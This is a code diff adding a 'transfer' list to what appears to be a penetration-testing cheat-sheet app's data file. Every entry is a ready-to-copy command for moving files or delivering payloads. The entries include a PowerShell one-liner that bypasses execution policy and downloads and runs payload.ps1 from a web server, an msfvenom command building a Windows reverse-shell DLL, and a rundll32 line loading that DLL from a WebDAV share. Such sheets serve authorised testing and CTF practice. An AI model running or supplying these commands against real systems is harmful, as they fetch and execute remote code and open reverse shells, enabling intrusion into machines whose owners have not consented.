@@ -86,3 +86,67 @@ export const stable = [
     value: `stty rows X cols Y`,
   },
 ];
+
+export const transfer = [
+  {
+    name: "Python HTTP Server",
+    steps: [
+      {
+        name: "Python2",
+        value: "python -m SimpleHTTPServer MYPORT",
+      },
+      {
+        name: "Python3",
+        value: "python -m http.server MYPORT",
+      },
+    ],
+  },
+  {
+    name: "Python FTP Server",
+    steps: [
+      {
+        name: "Local ftp server",
+        value: "python -m pyftpdlib",
+      },
+    ],
+  },
+  {
+    name: "Netcat",
+    steps: [
+      {
+        name: "Receiving end",
+        value: "nc -lnvp MYPORT > file",
+      },
+      {
+        name: "Sending end",
+        value: "nc -w 3 10.10.10.10 MYPORT < file",
+      },
+    ],
+  },
+  {
+    name: "Powershell",
+    steps: [
+      {
+        name: "from HTTP",
+        value: `powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex"`,
+      },
+      {
+        name: "from SMBServer",
+        value: `powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1`,
+      },
+    ],
+  },
+  {
+    name: "Rundll32",
+    steps: [
+      {
+        name: "Generate payload",
+        value: `msfvenom -p windows/shell/reverse_tcp LHOST=YourIP LPORT=MYPORT -f dll > payload.dll`,
+      },
+      {
+        name: "Delievery using SMB",
+        value: `rundll32 \\\\webdavserver\\folder\\payload.dll,entrypoint`,
+      },
+    ],
+  },
+];
